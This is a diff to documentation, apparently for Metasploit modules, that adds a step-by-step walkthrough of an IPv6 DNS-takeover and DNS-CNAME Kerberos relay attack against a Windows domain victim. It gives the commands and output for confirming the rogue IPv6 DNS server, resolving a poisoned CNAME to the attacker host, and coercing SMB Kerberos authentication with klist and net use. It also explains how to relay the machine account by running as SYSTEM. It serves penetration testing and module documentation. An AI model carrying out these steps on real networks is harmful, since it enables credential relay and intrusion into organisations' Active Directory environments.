@@ -217,6 +217,66 @@ msf auxiliary(spoof/ipv6/ipv6_ra_dns_takeover) > set RELAY_CNAME attacker.ad.exa
 msf auxiliary(spoof/ipv6/ipv6_ra_dns_takeover) > run
 ```
 
+Terminal 3 - on the Windows victim. Two things have to happen here: the victim
+must adopt the attacker as its IPv6 DNS server, and it must request a service
+ticket for the coerced name and connect to it over SMB.
+
+First confirm the victim has taken the attacker's advertisement as its IPv6
+resolver. The RA module advertises `SPOOF_IP6` via RDNSS (the DHCPv6 module
+hands it out in the lease); the attacker address should show up as an IPv6 DNS
+server on the victim's interface:
+
+```
+PS C:\> netsh interface ipv6 show dnsservers
+Configuration for interface "Ethernet"
+    DNS servers configured through DHCP:  dead:beef::5
+    Register with which suffix:           Primary only
+```
+
+If it has not adopted the advertisement yet, disable and re-enable the adapter
+(or wait for the next unsolicited RA). The RA module answers Router
+Solicitations, so toggling the interface prompts an immediate unicast reply.
+You can confirm the poisoning resolves through the attacker before triggering
+auth. With the CNAME answer now carrying its terminal address, a single query
+returns both the alias and the attacker address:
+
+```
+PS C:\> ipconfig /flushdns
+PS C:\> Resolve-DnsName relaytest.ad.example.com -Type AAAA -Server dead:beef::5
+
+Name                      Type   TTL   Section    NameHost
+----                      ----   ---   -------    --------
+relaytest.ad.example.com  CNAME  0     Answer     attacker.ad.example.com
+
+Name       : attacker.ad.example.com
+QueryType  : AAAA
+IP6Address : dead:beef::5
+```
+
+Then coerce the Kerberos SMB authentication. Purge cached tickets, request a
+service ticket for the coerced SPN (`CIFS/relaytest.ad.example.com`, set up
+under "SPN and DNS records for the coerced name" above) so a fresh AP-REQ is
+issued, and touch the name over SMB. The name resolves through the attacker's
+DNS to the attacker's SMB server, so the SMB2 SessionSetup carrying the AP-REQ
+lands on the relay:
+
+```
+C:\> klist purge
+C:\> klist get CIFS/relaytest.ad.example.com
+C:\> net use \\relaytest.ad.example.com\ipc$
+```
+
+`net use` reporting `System error 67 (The network name cannot be found)` is
+expected: the relay captures the AP-REQ during SessionSetup and never presents a
+real share, so the client's tree connect fails after the authentication the
+relay needed has already been sent.
+
+For a machine-account relay (`RELAY_IDENTITY AD\WIN-VICTIM$`), run the trigger
+from the machine-account context, that is as `NT AUTHORITY\SYSTEM` (for example
+`PsExec -s` or a `schtasks /ru SYSTEM` task), since an interactive user session
+would authenticate as that user instead. See "Coercing the machine account"
+above.
+
 Real output of `show options` for the coercion module (the Router Advertisement
 variant; the DHCPv6 module takes the same `TARGET_DOMAIN`/`SPOOF_IP6`/
 `RELAY_CNAME`):
@@ -230,7 +290,7 @@ Module options (auxiliary/spoof/ipv6/ipv6_ra_dns_takeover):
    BECOME_ROUTER            false                    yes       Also advertise as the default router (router lifetime > 0). Off by default for a DNS-only takeover.
    INTERFACE                eth0                     no        The name of the interface
    RA_INTERVAL              30                       yes       Seconds between unsolicited Router Advertisements.
-   RELAY_CNAME              attacker.ad.example.com  no        If set, poisoned names are answered with a CNAME to this name (the DNS-CNAME Kerberos relay trick) instead of a direct address.
+   RELAY_CNAME              attacker.ad.example.com  no        If set, poisoned names are answered with a CNAME to this name plus its terminal attacker address (the DNS-CNAME Kerberos relay trick).
    RESPOND_TO_SOLICITS      true                     yes       Also reply to Router Solicitations with an immediate unicast RA.
    SHOST                                             no        The source IPv6 address
    SMAC                                              no        The source MAC address
